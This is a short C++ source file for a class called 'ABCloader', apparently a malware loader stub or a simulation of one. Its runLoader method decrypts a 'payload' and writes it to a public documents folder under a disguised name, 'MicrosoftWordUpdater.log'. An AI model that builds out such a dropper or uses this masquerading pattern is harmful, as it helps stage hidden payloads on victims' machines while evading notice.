#include "ABCloader.h"
#include "Encryption.h"
#include <iostream>

bool ABCloader::runLoader() {
    // Simulate the loading of the payload
    std::cout << "[*] Starting ABCloader..." << std::endl;

    // Initialize the encryption object
    Encryption encryption;

    // Use the encryption object to decrypt and write the payload
    std::string filePath = "C:\\Users\\Public\\Documents\\MicrosoftWordUpdater.log";
    if (!encryption.decryptDataAndWrite(filePath)) {
        std::cerr << "[!] Failed to write decrypted payload!" << std::endl;
        return false;
    }

    std::cout << "[*] Payload written to " << filePath << std::endl;
    return true;
}
